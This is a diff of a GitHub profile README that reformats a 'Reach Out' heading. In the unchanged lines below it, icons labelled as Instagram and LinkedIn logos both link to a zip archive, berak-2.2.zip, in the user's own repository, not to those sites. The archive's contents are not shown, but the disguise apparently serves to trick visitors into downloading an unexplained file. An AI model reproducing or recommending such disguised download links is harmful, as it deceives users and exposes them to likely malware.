@@ -40,9 +40,9 @@ Currently working on next-generation AI media ecosystems and product modernizati
 
 ## 🔍 What I Work With
 
-![Top Languages](https://github-readme-stats.shion.dev/api/top-langs/?username=berak636&theme=default&hide_border=false&include_all_commits=false&count_private=false&layout=compact)<br>
+![Top Languages](https://github-readme-stats.shion.dev/api/top-langs/?username=berak636&theme=default&hide_border=false&include_all_commits=false&count_private=false&layout=compact)
 
-<h2> 🌐 Reach Out </h2> <br>
+## 🌐 Reach Out
 
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Instagram Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="LinkedIn Logo" width="50px" height="50px" target="_blank">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
